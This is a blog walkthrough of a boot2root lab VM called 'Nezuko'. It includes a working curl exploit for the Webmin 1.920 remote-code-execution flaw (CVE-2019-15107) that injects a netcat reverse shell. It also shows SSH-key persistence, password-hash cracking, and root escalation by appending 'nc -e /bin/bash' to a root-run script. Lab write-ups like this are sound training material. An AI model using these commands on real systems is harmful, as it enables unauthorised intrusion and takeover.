---
layout: post
title: "VM Nezuko Boot2Root Writeup"
categories: jekyll
permalink : /others/vm_nezuko
---

Hi there. This is my boot2root writeup for a vm called "Nezuko". For those who didn't manage to play with it, download the vm (add link to vm) and come back when you have finished.

### About Nezuko VM

![nezukovm](/musubi/assets/vm_nezuko/nezukovm.png)

I would consider this as an easy to intermediate level machine. But, if you need some hints, do reach me on [Twitter](htttps://twitter.com/yunaranyancat)

## Walkthrough

### Enumeration

Let's assume that we put our attacking machine (Kali) and Nezuko VM inside the same subnet which is `10.10.10.0/24` .
Therefore, by running `netdiscover -i eth0 -r 10.10.10.0/24` , we will find out that Nezuko vm is located at `10.10.10.4`.

p/s : the Kali vm has an IP of `10.10.10.5` . This is useful for us to create a reverse shell later.

![netdiscover](/musubi/assets/vm_nezuko/netdiscover.png)

By running `nmap -sS -sC -sV -oA nezukocommon 10.10.10.4` , we will get the following output.

![nmapcommon](/musubi/assets/vm_nezuko/nmapcommon.png)

Now, let's go to the webpage of `10.10.10.4` .

![nezukowebpage](/musubi/assets/vm_nezuko/nezukowebpage.png)

Nothing interesting except for nezuko chan.. ಥ ⌣ ಥ

By going to `10.10.10.4/robots.txt` , we will find an encoded text there.

![robotswebpage](/musubi/assets/vm_nezuko/robotswebpage.png)

The text is encoded with base32. Using online decoder such as this [site](https://emn178.github.io/online-tools/base32_decode.html) , we will get below plaintext.

![base32_decoded](/musubi/assets/vm_nezuko/base32_decoded.png)

Since we got a hint from nezuko saying this is not the right port to enumerate. We will run an nmap scan again now to scan all ports.

Note : By default, nmap will only scan for common 1000 ports. You can check the specific ports that nmap scans using the default scan on this [site](https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/).

By running `nmap -sS -sC -sV -p- -oA nezukoallports 10.10.10.4` , we will get below output.

![nmapallports](/musubi/assets/vm_nezuko/nmapallports.png)

It seems that port `13337` is running a `webmin` service. This might be an entry point for us.

### Exploitation

The target is running `webmin 1.920` . After some searching for webmin vulnerabilities, we will find a remote code execution vulnerability related to this specific version of webmin.

- [https://www.exploit-db.com/exploits/47293](https://www.exploit-db.com/exploits/47293)

![testexploit](/musubi/assets/vm_nezuko/testexploit.png)

Another link will lead us to a Metasploit module. However, we will not be using Metasploit because it will ruin all of the fun.

- [https://www.exploit-db.com/exploits/47230](https://www.exploit-db.com/exploits/47230)

![metasploit](/musubi/assets/vm_nezuko/metasploit.png)

Copy the shell script (in the first link) to our Kali to test if the target is vulnerable to rce exploit or not.

![vulnerablecheck](/musubi/assets/vm_nezuko/vulnerablecheck.png)

So it seems that the target is vulnerable.

We will modify the test code so that we can get a shell from the machine.

Our final exploit code should look something like this.

{% highlight bash %}
#!/bin/sh
URI=$1;

echo -n "Exploit for RCE (CVE-2019-15107) on $URI: ";
curl -ks $URI'/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id|nc -e /bin/bash 10.10.10.5 1337 &new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H "Content-Type: application/x-www-form-urlencoded" -H 'Referer: '$URI'/session_login.cgi' -X POST
{% endhighlight %}

Before running the exploit we should start our netcat listener on our Kali.

![listener_1337](/musubi/assets/vm_nezuko/listener_1337.png)

Then run the exploit code,
{% highlight bash %}
root@kali:~#sh exploit.sh https://10.10.10.4:13337
{% endhighlight %}

![nezuko_shell](/musubi/assets/vm_nezuko/nezuko_shell.png)

We got a shell as nezuko!

### (Optional) Upgrade to SSH session

We can obtain ssh session as nezuko by adding our public key to `/home/nezuko/.ssh/authorized_keys`.

First we need to generate our own private and public SSH key.

{% highlight bash %}
root@kali:~#ssh-keygen -t rsa
{% endhighlight %}

Save the key in our current working directory by putting a name when prompted for the filename, in this case, the filename will be `yunaranyancat`

Copy the content of `yunaranyancat.pub` to `/home/nezuko/.ssh/authorized_keys`

![ssh-keygen](/musubi/assets/vm_nezuko/ssh-keygen.png)

![copytoauthkeys](/musubi/assets/vm_nezuko/copytoauthkeys.png)

After that we can ssh as nezuko using following command

![sshprivate](/musubi/assets/vm_nezuko/sshprivate.png)

### Changing user to zenitsu

We find out that `/etc/passwd` is readable and furthermore, it reveals `zenitsu` password hash.

![etcpasswd](/musubi/assets/vm_nezuko/etcpasswd.png)

We can try to crack the hash using hashcat by typing following command.

![copytocrack](/musubi/assets/vm_nezuko/copytocrack.png)

![examplehash](/musubi/assets/vm_nezuko/examplehash.png)

And after waiting for a while, the hash has been cracked and stored inside file `cracked`.

![cracked](/musubi/assets/vm_nezuko/cracked.png)

Once we got the password, which is `meowmeow` , we can su as `zenitsu` user.

{% highlight bash %}
nezuko@ubuntu:~#su zenitsu
{% endhighlight %}

and when prompted with password, put `meowmeow` and then click enter.

### Privilege escalation

As `nezuko` user before, we found out that there is a folder named `from_zenitsu` in the home directory and now as `zenitsu`, we found a folder named `to_nezuko`. Upon inspecting both folder, we can say that these directories;

- from_zenitsu : contains message sent by zenitsu every 5 minutes (based on the name of the messages)

- to_nezuko : contains a bash script owned by zenitsu that will send a message to nezuko.

However, upon further inspection, we found out that the script is being run by `root` instead. That's why the messages sent to nezuko home directory are owned by `root`.

We can verify it by running
{% highlight bash %}
nezuko@ubuntu:~#ls -la /home/nezuko/from_zenitsu/*
{% endhighlight %}

This means that, we can escalate our current privileges to `root` privileges by modifying the content of bash.

Since the owner of the script is `zenitsu` , then it is possible to overwrite the script.

![cannot_change_bash](/musubi/assets/vm_nezuko/cannot_change_bash.png)

But, it seems that we obtained `permission denied` when trying to overwrite the content of the bash script.

### Exploiting file attributes

When running `lsattr` on the bash script, it showed that the file attribute of the bash script has been changed to `a`(append) mode only. This means we can only append the script but cannot overwrite it.

![lsattr](/musubi/assets/vm_nezuko/lsattr.png)

With a slight modification to our command, we managed to append our own command which will connect to our Kali.

{% highlight bash %}
zenitsu@ubuntu:~/to_nezuko$echo "nc -e /bin/bash 10.10.10.5 1234" >> send_message_to_nezuko.sh
{% endhighlight %}

Set up our listener to listen on port 1234

![listener_1234](/musubi/assets/vm_nezuko/listener_1234.png)

After waiting for couple of minutes for the script to be executed, we managed to get a root shell!

![root](/musubi/assets/vm_nezuko/root.png)

### Wrap up

Thank you for taking your time to read the writeup and I hope you enjoyed playing with my first vm. :>
